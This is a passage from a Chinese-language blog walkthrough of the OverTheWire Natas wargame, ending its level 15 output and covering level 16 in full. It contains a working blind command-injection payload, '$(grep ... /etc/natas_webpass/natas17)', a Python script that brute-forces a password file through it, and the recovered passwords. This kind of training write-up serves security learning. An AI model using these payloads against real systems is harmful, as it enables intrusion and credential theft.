Natas15 -&gt; Natas16 Start!</span><br><span class="line">[-] Characters Used :  0</span><br><span class="line">[-] Characters Used :  03</span><br><span class="line">[-] Characters Used :  035</span><br><span class="line">[-] Characters Used :  0356</span><br><span class="line">[-] Characters Used :  03569</span><br><span class="line">[-] Characters Used :  03569a</span><br><span class="line">[-] Characters Used :  03569ac</span><br><span class="line">[-] Characters Used :  03569ace</span><br><span class="line">[-] Characters Used :  03569aceh</span><br><span class="line">[-] Characters Used :  03569acehi</span><br><span class="line">[-] Characters Used :  03569acehij</span><br><span class="line">[-] Characters Used :  03569acehijm</span><br><span class="line">[-] Characters Used :  03569acehijmn</span><br><span class="line">[-] Characters Used :  03569acehijmnp</span><br><span class="line">[-] Characters Used :  03569acehijmnpq</span><br><span class="line">[-] Characters Used :  03569acehijmnpqt</span><br><span class="line">[-] Characters Used :  03569acehijmnpqtw</span><br><span class="line">[-] Characters Used :  03569acehijmnpqtwB</span><br><span class="line">[-] Characters Used :  03569acehijmnpqtwBE</span><br><span class="line">[-] Characters Used :  03569acehijmnpqtwBEH</span><br><span class="line">[-] Characters Used :  03569acehijmnpqtwBEHI</span><br><span class="line">[-] Characters Used :  03569acehijmnpqtwBEHIN</span><br><span class="line">[-] Characters Used :  03569acehijmnpqtwBEHINO</span><br><span class="line">[-] Characters Used :  03569acehijmnpqtwBEHINOR</span><br><span class="line">[-] Characters Used :  03569acehijmnpqtwBEHINORW</span><br><span class="line">[-] Password :  W *******************************</span><br><span class="line">[-] Password :  Wa ******************************</span><br><span class="line">[-] Password :  WaI *****************************</span><br><span class="line">[-] Password :  WaIH ****************************</span><br><span class="line">[-] Password :  WaIHE ***************************</span><br><span class="line">[-] Password :  WaIHEa **************************</span><br><span class="line">[-] Password :  WaIHEac *************************</span><br><span class="line">[-] Password :  WaIHEacj ************************</span><br><span class="line">[-] Password :  WaIHEacj6 ***********************</span><br><span class="line">[-] Password :  WaIHEacj63 **********************</span><br><span class="line">[-] Password :  WaIHEacj63w *********************</span><br><span class="line">[-] Password :  WaIHEacj63wn ********************</span><br><span class="line">[-] Password :  WaIHEacj63wnN *******************</span><br><span class="line">[-] Password :  WaIHEacj63wnNI ******************</span><br><span class="line">[-] Password :  WaIHEacj63wnNIB *****************</span><br><span class="line">[-] Password :  WaIHEacj63wnNIBR ****************</span><br><span class="line">[-] Password :  WaIHEacj63wnNIBRO ***************</span><br><span class="line">[-] Password :  WaIHEacj63wnNIBROH **************</span><br><span class="line">[-] Password :  WaIHEacj63wnNIBROHe *************</span><br><span class="line">[-] Password :  WaIHEacj63wnNIBROHeq ************</span><br><span class="line">[-] Password :  WaIHEacj63wnNIBROHeqi ***********</span><br><span class="line">[-] Password :  WaIHEacj63wnNIBROHeqi3 **********</span><br><span class="line">[-] Password :  WaIHEacj63wnNIBROHeqi3p *********</span><br><span class="line">[-] Password :  WaIHEacj63wnNIBROHeqi3p9 ********</span><br><span class="line">[-] Password :  WaIHEacj63wnNIBROHeqi3p9t *******</span><br><span class="line">[-] Password :  WaIHEacj63wnNIBROHeqi3p9t0 ******</span><br><span class="line">[-] Password :  WaIHEacj63wnNIBROHeqi3p9t0m *****</span><br><span class="line">[-] Password :  WaIHEacj63wnNIBROHeqi3p9t0m5 ****</span><br><span class="line">[-] Password :  WaIHEacj63wnNIBROHeqi3p9t0m5n ***</span><br><span class="line">[-] Password :  WaIHEacj63wnNIBROHeqi3p9t0m5nh **</span><br><span class="line">[-] Password :  WaIHEacj63wnNIBROHeqi3p9t0m5nhm *</span><br><span class="line">[-] Password :  WaIHEacj63wnNIBROHeqi3p9t0m5nhmh </span><br><span class="line">[*] Natas15 -&gt; Natas16 Completed!</span><br></pre></td></tr></table></figure>
+
+<p>密码是：<code>WaIHEacj63wnNIBROHeqi3p9t0m5nhmh</code>。</p>
+<h3 id="natas-Level-15-gt-natas-Level-16"><a href="#natas-Level-15-gt-natas-Level-16" class="headerlink" title="natas Level 15 -&gt; natas Level 16"></a>natas Level 15 -&gt; natas Level 16</h3><p>链接：<a href="http://natas16.natas.labs.overthewire.org" target="_blank" rel="noopener">http://natas16.natas.labs.overthewire.org</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">$key = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(array_key_exists(<span class="string">"needle"</span>, $_REQUEST)) &#123;</span><br><span class="line">    $key = $_REQUEST[<span class="string">"needle"</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($key != <span class="string">""</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/[;|&amp;`\'"]/'</span>,$key)) &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Input contains an illegal character!"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        passthru(<span class="string">"grep -i \"$key\" dictionary.txt"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这道题和前面的一道题的差别有两点：</p>
+<ol>
+<li>过滤的字符增加了</li>
+<li>用户可控的<code>$key</code>用双括号<code>&quot;&quot;</code>处理了</li>
+</ol>
+<p>我看了网上别的大佬的WP，发现可以用<code>grep</code>来实现盲注，我们知道用<code>grep</code>查找文件中的某个字符串时，如果能找到，则返回整个该字符串所在行的字符，反之什么都不返回。</p>
+<p><img src="/2020/04/20/OverTheWire-Natas-Walkthrough-1/imgs/18.png" alt="18"></p>
+<p>我们已经知道<code>natas17</code>的密码存放在<code>/etc/natas_webpass/natas17</code>，所以对于</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep a /etc/natas_webpass/natas17</span><br></pre></td></tr></table></figure>
+
+<p>如果字符<code>a</code>在<code>/etc/natas_webpass/natas17</code>中就会返回整行密码，反之则返回<code>&quot;&quot;</code>。</p>
+<p>现在只需要让<code>grep a /etc/natas_webpass/natas17</code>执行即可。我们知道在linux中，`符号和$()都可以执行命令，现在过滤的只是前者，所以可以构造：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -i \"$(grep a /etc/natas_webpass/natas17)\" dictionary.txt</span><br></pre></td></tr></table></figure>
+
+<p>对于<code>$(grep a /etc/natas_webpass/natas17)</code>，返回的是<code>dictionary.txt</code>中的内容：</p>
+<p><img src="/2020/04/20/OverTheWire-Natas-Walkthrough-1/imgs/20.png" alt="20"></p>
+<p>说明<code>$(grep a /etc/natas_webpass/natas17)</code>的结果是<code>&quot;&quot;</code>，也就是字符<code>a</code>并不在，所以最后会执行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -i "" dictionary.txt</span><br></pre></td></tr></table></figure>
+
+<p>会返回整个<code>dictionary.txt</code>的内容。</p>
+<p>而对于<code>$(grep A /etc/natas_webpass/natas17)</code>，返回的是<code>Output:\n&lt;pre&gt;\n&lt;/pre&gt;</code>：</p>
+<p><img src="/2020/04/20/OverTheWire-Natas-Walkthrough-1/imgs/19.png" alt="19"></p>
+<p>说明字符<code>A</code>在<code>/etc/natas_webpass/natas17</code>中，所以会返回整行文本，再和<code>dictionary.txt</code>中的文本进行匹配，自然匹配不到任何东西，所以不会输出任何东西。</p>
+<p>循着这个思路，可以写一个脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPBasicAuth</span><br><span class="line"></span><br><span class="line">username = <span class="string">'natas16'</span></span><br><span class="line">password = <span class="string">'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'</span></span><br><span class="line">chars = <span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line">candidate_chars = <span class="string">''</span></span><br><span class="line">passwd = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (<span class="string">"[*] Start!"</span>)</span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> chars:</span><br><span class="line">    payload = <span class="string">'$(grep '</span> + ch + <span class="string">' /etc/natas_webpass/natas17'</span></span><br><span class="line">    url = <span class="string">'http://natas16.natas.labs.overthewire.org/?needle='</span> + payload + <span class="string">')&amp;submit=Search'</span></span><br><span class="line">    r = requests.get(url = url, auth=HTTPBasicAuth(username, password))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'Output:\n&lt;pre&gt;\n&lt;/pre&gt;'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        candidate_chars += ch</span><br><span class="line">        print(<span class="string">'[-] Characaters Used : '</span>, candidate_chars)</span><br><span class="line"><span class="comment">#candidate_chars = '035789bcdghkmnqrswAGHNPQSW'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">32</span>):</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> candidate_chars:</span><br><span class="line">        payload = <span class="string">'$(grep ^'</span> + passwd + ch + <span class="string">' /etc/natas_webpass/natas17)'</span></span><br><span class="line">        url = <span class="string">'http://natas16.natas.labs.overthewire.org/?needle='</span> + payload + <span class="string">'&amp;submit=Search'</span></span><br><span class="line">        r = requests.get(url=url, auth=HTTPBasicAuth(username, password))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Output:\n&lt;pre&gt;\n&lt;/pre&gt;'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            passwd += ch</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"[-] Password : "</span>, passwd, <span class="string">'*'</span>*(<span class="number">32</span>-i<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (<span class="string">"[*] Completed!"</span>)</span><br></pre></td></tr></table></figure>
+
+<p>第一个for循环主要是找出在密码中用到的字符，第二个for循环：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'$(grep ^'</span> + passwd + ch + <span class="string">' /etc/natas_webpass/natas17)'</span></span><br></pre></td></tr></table></figure>
+
+<p>用<code>^</code>来限定第一个字符。</p>
+<p>最后得到结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">[*] Start!</span><br><span class="line">[-] Characaters Used :  0</span><br><span class="line">[-] Characaters Used :  03</span><br><span class="line">[-] Characaters Used :  035</span><br><span class="line">[-] Characaters Used :  0357</span><br><span class="line">[-] Characaters Used :  03578</span><br><span class="line">[-] Characaters Used :  035789</span><br><span class="line">[-] Characaters Used :  035789b</span><br><span class="line">[-] Characaters Used :  035789bc</span><br><span class="line">[-] Characaters Used :  035789bcd</span><br><span class="line">[-] Characaters Used :  035789bcdg</span><br><span class="line">[-] Characaters Used :  035789bcdgh</span><br><span class="line">[-] Characaters Used :  035789bcdghk</span><br><span class="line">[-] Characaters Used :  035789bcdghkm</span><br><span class="line">[-] Characaters Used :  035789bcdghkmn</span><br><span class="line">[-] Characaters Used :  035789bcdghkmnq</span><br><span class="line">[-] Characaters Used :  035789bcdghkmnqr</span><br><span class="line">[-] Characaters Used :  035789bcdghkmnqrs</span><br><span class="line">[-] Characaters Used :  035789bcdghkmnqrsw</span><br><span class="line">[-] Characaters Used :  035789bcdghkmnqrswA</span><br><span class="line">[-] Characaters Used :  035789bcdghkmnqrswAG</span><br><span class="line">[-] Characaters Used :  035789bcdghkmnqrswAGH</span><br><span class="line">[-] Characaters Used :  035789bcdghkmnqrswAGHN</span><br><span class="line">[-] Characaters Used :  035789bcdghkmnqrswAGHNP</span><br><span class="line">[-] Characaters Used :  035789bcdghkmnqrswAGHNPQ</span><br><span class="line">[-] Characaters Used :  035789bcdghkmnqrswAGHNPQS</span><br><span class="line">[-] Characaters Used :  035789bcdghkmnqrswAGHNPQSW</span><br><span class="line">[-] Password :  8 *******************************</span><br><span class="line">[-] Password :  8P ******************************</span><br><span class="line">[-] Password :  8Ps *****************************</span><br><span class="line">[-] Password :  8Ps3 ****************************</span><br><span class="line">[-] Password :  8Ps3H ***************************</span><br><span class="line">[-] Password :  8Ps3H0 **************************</span><br><span class="line">[-] Password :  8Ps3H0G *************************</span><br><span class="line">[-] Password :  8Ps3H0GW ************************</span><br><span class="line">[-] Password :  8Ps3H0GWb ***********************</span><br><span class="line">[-] Password :  8Ps3H0GWbn **********************</span><br><span class="line">[-] Password :  8Ps3H0GWbn5 *********************</span><br><span class="line">[-] Password :  8Ps3H0GWbn5r ********************</span><br><span class="line">[-] Password :  8Ps3H0GWbn5rd *******************</span><br><span class="line">[-] Password :  8Ps3H0GWbn5rd9 ******************</span><br><span class="line">[-] Password :  8Ps3H0GWbn5rd9S *****************</span><br><span class="line">[-] Password :  8Ps3H0GWbn5rd9S7 ****************</span><br><span class="line">[-] Password :  8Ps3H0GWbn5rd9S7G ***************</span><br><span class="line">[-] Password :  8Ps3H0GWbn5rd9S7Gm **************</span><br><span class="line">[-] Password :  8Ps3H0GWbn5rd9S7GmA *************</span><br><span class="line">[-] Password :  8Ps3H0GWbn5rd9S7GmAd ************</span><br><span class="line">[-] Password :  8Ps3H0GWbn5rd9S7GmAdg ***********</span><br><span class="line">[-] Password :  8Ps3H0GWbn5rd9S7GmAdgQ **********</span><br><span class="line">[-] Password :  8Ps3H0GWbn5rd9S7GmAdgQN *********</span><br><span class="line">[-] Password :  8Ps3H0GWbn5rd9S7GmAdgQNd ********</span><br><span class="line">[-] Password :  8Ps3H0GWbn5rd9S7GmAdgQNdk *******</span><br><span class="line">[-] Password :  8Ps3H0GWbn5rd9S7GmAdgQNdkh ******</span><br><span class="line">[-] Password :  8Ps3H0GWbn5rd9S7GmAdgQNdkhP *****</span><br><span class="line">[-] Password :  8Ps3H0GWbn5rd9S7GmAdgQNdkhPk ****</span><br><span class="line">[-] Password :  8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq ***</span><br><span class="line">[-] Password :  8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9 **</span><br><span class="line">[-] Password :  8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9c *</span><br><span class="line">[-] Password :  8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw </span><br><span class="line">[*] Completed!</span><br></pre></td></tr></table></figure>
+
+<p>所以下一关的密码是：<code>8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw</code>。</p>
+<p>—————————————————- 手动分界线 —————————————————-</p>
+<p>因为篇幅还有时间的原因，就先写这么多吧，这个Natas靶场一共有34关，就先做一半吧。</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Bantian</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://bantttian.github.io/2020/04/20/OverTheWire-Natas-Walkthrough-1/">https://bantttian.github.io/2020/04/20/OverTheWire-Natas-Walkthrough-1/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>早睡早起身体好</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/Web/"># Web</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/04/23/OverTheWire-Natas-Walkthrough-2/">OverTheWire Natas Walkthrough-2</a>
+            
+            
+            <a class="next" rel="next" href="/2020/04/11/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/">强网杯2019_随便注之堆叠注入</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Bantian | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
